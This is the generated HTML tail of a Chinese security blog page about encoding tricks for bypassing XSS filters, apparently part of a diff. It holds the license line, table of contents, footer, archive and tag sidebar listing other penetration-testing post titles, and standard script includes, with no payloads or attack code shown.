+            <p>更新日期：<a href="http://yoursite.com/2018/12/02/xss/编码绕过XSS/">July 21st 2019, 12:31:46 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/12/24/Web渗透/XXE/XXE示例及应用/" title= "XXE 示例及利用">
+                    <div class="nextTitle">XXE 示例及利用</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/07/23/BCH分叉/" title= "BCH分叉-重放攻击解决方案">
+                    <div class="prevTitle">BCH分叉-重放攻击解决方案</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:12345@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fi3ework" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#标签"><span class="toc-number">1.</span> <span class="toc-text">标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Base64编码绕过"><span class="toc-number">2.</span> <span class="toc-text">Base64编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML编码16进制-10进制-amp-x-amp"><span class="toc-number">3.</span> <span class="toc-text">HTML编码16进制/10进制 &amp;#x/&amp;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#magic-quote-gpc绕过"><span class="toc-number">4.</span> <span class="toc-text">magic_quote_gpc绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#javascript-jsunicode-8进制和16进制"><span class="toc-number">5.</span> <span class="toc-text">javascript jsunicode 8进制和16进制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#宽字节绕过"><span class="toc-number">6.</span> <span class="toc-text">宽字节绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#头部Base绕过"><span class="toc-number">7.</span> <span class="toc-text">头部Base绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#url编码"><span class="toc-number">8.</span> <span class="toc-text">url编码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#浏览器编码解码原理"><span class="toc-number"></span> <span class="toc-text">浏览器编码解码原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#重点是接下来的编码解码顺序"><span class="toc-number">1.</span> <span class="toc-text">重点是接下来的编码解码顺序</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#构造DOM树"><span class="toc-number">1.1.</span> <span class="toc-text">构造DOM树</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#js解释器"><span class="toc-number">1.2.</span> <span class="toc-text">js解释器</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#案例"><span class="toc-number">2.</span> <span class="toc-text">案例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#xss中禁用了-amp-符号"><span class="toc-number">2.1.</span> <span class="toc-text">xss中禁用了&amp;#符号</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#在线工具"><span class="toc-number">3.</span> <span class="toc-text">在线工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 19
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/" >jackson反序列化漏洞_1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/2020/01/13/Web渗透/java反序列化/java反弹shell/" >java反弹shell</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/13</span><a class="archive-post-title" href= "/2019/12/13/Web渗透/java反序列化/java_sql注入/" >java sql注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href= "/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/" >Apache Solr CVE-2019-0193 复现与学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span><a class="archive-post-title" href= "/2019/07/28/Web渗透/漏洞学习/fastjson_2/" >fastjson 反序列化（二）</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/07/21/安全策略/json/" >json与jsonp的学习与分析</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/21</span><a class="archive-post-title" href= "/2019/07/21/xss/DOM-XSS漏洞挖掘与攻击面延伸/" >DOM XSS从javascript中输出数据到HTML页面</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/2019/07/18/Web渗透/漏洞学习/fastjson/" >fastjson 1.2.47 rce</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span><a class="archive-post-title" href= "/2019/07/11/内网渗透/计划任务/" >计划任务</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/08</span><a class="archive-post-title" href= "/2019/07/08/Web渗透/XXE/XXE实例及应用3/" >XXE实例及应用3</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/06/10/工具使用/wireshark使用记录/" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/" >ETH 漏洞复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/28</span><a class="archive-post-title" href= "/2019/01/28/Web渗透/XXE/XXE实例及利用2/" >XXE 示例及利用-java—SDK-1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2019/01/22/移动端/frida1/" >frida理解与学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href= "/2019/01/10/安全策略/csp/" >安全策略-csp理解与学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/2019/01/01/2019/" >2019</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2018/12/24/Web渗透/XXE/XXE示例及应用/" >XXE 示例及利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href= "/2018/12/02/xss/编码绕过XSS/" >编码绕过xss</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/BCH分叉/" >BCH分叉-重放攻击解决方案</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="生活"><span class="iconfont-archer">&#xe606;</span>生活</span>
+    
+        <span class="sidebar-tag-name" data-tags="规划"><span class="iconfont-archer">&#xe606;</span>规划</span>
+    
+        <span class="sidebar-tag-name" data-tags="区块链安全"><span class="iconfont-archer">&#xe606;</span>区块链安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="浏览器安全策略"><span class="iconfont-archer">&#xe606;</span>浏览器安全策略</span>
+    
+        <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="计划任务"><span class="iconfont-archer">&#xe606;</span>计划任务</span>
+    
+        <span class="sidebar-tag-name" data-tags="移动端"><span class="iconfont-archer">&#xe606;</span>移动端</span>
+    
+        <span class="sidebar-tag-name" data-tags="frida"><span class="iconfont-archer">&#xe606;</span>frida</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web安全"><span class="iconfont-archer">&#xe606;</span>Web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web渗透"><span class="iconfont-archer">&#xe606;</span>Web渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="常规渗透"><span class="iconfont-archer">&#xe606;</span>常规渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
+    
+        <span class="sidebar-tag-name" data-tags="web 渗透"><span class="iconfont-archer">&#xe606;</span>web 渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="java反序列化"><span class="iconfont-archer">&#xe606;</span>java反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="java sql注入"><span class="iconfont-archer">&#xe606;</span>java sql注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="jackson"><span class="iconfont-archer">&#xe606;</span>jackson</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE 实例利用"><span class="iconfont-archer">&#xe606;</span>XXE 实例利用</span>
+    
+        <span class="sidebar-tag-name" data-tags="java反弹shell"><span class="iconfont-archer">&#xe606;</span>java反弹shell</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞学习"><span class="iconfont-archer">&#xe606;</span>漏洞学习</span>
+    
+        <span class="sidebar-tag-name" data-tags="Apache Solr CVE-2019-0193"><span class="iconfont-archer">&#xe606;</span>Apache Solr CVE-2019-0193</span>
+    
+        <span class="sidebar-tag-name" data-tags="fastjson"><span class="iconfont-archer">&#xe606;</span>fastjson</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="区块链安全"><span class="iconfont-archer">&#xe60a;</span>区块链安全</span>
+    
+        <span class="sidebar-category-name" data-categories="浏览器安全策略"><span class="iconfont-archer">&#xe60a;</span>浏览器安全策略</span>
+    
+        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="Web渗透"><span class="iconfont-archer">&#xe60a;</span>Web渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="浏览器安全策略/csp"><span class="iconfont-archer">&#xe60a;</span>浏览器安全策略/csp</span>
+    
+        <span class="sidebar-category-name" data-categories="内网渗透/计划任务"><span class="iconfont-archer">&#xe60a;</span>内网渗透/计划任务</span>
+    
+        <span class="sidebar-category-name" data-categories="Web渗透/安全策略"><span class="iconfont-archer">&#xe60a;</span>Web渗透/安全策略</span>
+    
+        <span class="sidebar-category-name" data-categories="Web安全"><span class="iconfont-archer">&#xe60a;</span>Web安全</span>
+    
+        <span class="sidebar-category-name" data-categories="Web渗透/常规渗透"><span class="iconfont-archer">&#xe60a;</span>Web渗透/常规渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="Web安全/XSS"><span class="iconfont-archer">&#xe60a;</span>Web安全/XSS</span>
+    
+        <span class="sidebar-category-name" data-categories="Web渗透/常规渗透/XSS"><span class="iconfont-archer">&#xe60a;</span>Web渗透/常规渗透/XSS</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透"><span class="iconfont-archer">&#xe60a;</span>web-渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/java反序列化"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/漏洞学习"><span class="iconfont-archer">&#xe60a;</span>web-渗透/漏洞学习</span>
+    
+        <span class="sidebar-category-name" data-categories="Web渗透/漏洞学习"><span class="iconfont-archer">&#xe60a;</span>Web渗透/漏洞学习</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/java反弹shell"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/java反弹shell</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/java-sql注入"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/java-sql注入</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/漏洞学习/Apache-Solr-CVE-2019-0193"><span class="iconfont-archer">&#xe60a;</span>web-渗透/漏洞学习/Apache-Solr-CVE-2019-0193</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/jackson"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/jackson</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/漏洞学习/fastjson"><span class="iconfont-archer">&#xe60a;</span>web-渗透/漏洞学习/fastjson</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "th3wind"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
